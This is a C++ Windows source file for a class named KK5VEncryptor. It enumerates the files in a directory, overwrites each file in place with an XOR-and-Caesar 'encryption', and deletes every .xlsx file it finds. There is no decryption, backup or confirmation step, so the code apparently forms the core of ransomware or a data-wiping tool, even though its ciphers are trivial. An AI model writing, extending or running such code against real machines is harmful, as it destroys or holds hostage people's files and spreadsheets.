#include "kk5v.h"
#include <fstream>
#include <sstream>
#include <windows.h>
#include <direct.h>

using namespace std;

// Helper function to list all files in a directory
vector<string> KK5VEncryptor::getFilesInDirectory(const string& directory) {
    vector<string> files;
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            const string fileName = findFileData.cFileName;
            if (fileName != "." && fileName != "..") {
                files.push_back(directory + "\\" + fileName);
            }
        } while (FindNextFile(hFind, &findFileData));
        FindClose(hFind);
    }
    return files;
}

// Helper function to read a file into a string
string KK5VEncryptor::readFile(const string& filename) {
    ifstream file(filename, ios::binary);
    stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

// Helper function to write a string to a file
void KK5VEncryptor::writeFile(const string& filename, const string& content) {
    ofstream file(filename, ios::binary);
    file << content;
}

// XOR encryption method
void KK5VEncryptor::xorEncrypt(string& content, const char key) {
    for (char& c : content) {
        c ^= key;
    }
}

// Caesar cipher encryption method
void KK5VEncryptor::caesarEncrypt(string& content, int shift) {
    for (char& c : content) {
        if (isalpha(c)) {
            char base = islower(c) ? 'a' : 'A';
            c = (c - base + shift) % 26 + base;
        }
    }
}

// Remove all .xlsx files in the specified directory
void KK5VEncryptor::removeXlsxFiles(const string& directory) {
    vector<string> files = getFilesInDirectory(directory);
    for (const string& file : files) {
        if (file.substr(file.find_last_of(".") + 1) == "xlsx") {
            DeleteFile(file.c_str());
        }
    }
}

// Encrypt the file using XOR and Caesar cipher
void KK5VEncryptor::encryptFile(const string& filename) {
    string content = readFile(filename);

    // Perform XOR encryption with a sample key
    xorEncrypt(content, 0x5A);

    // Perform Caesar cipher encryption with a sample shift
    caesarEncrypt(content, 3);

    // Save the encrypted content back to the file
    writeFile(filename, content);
}
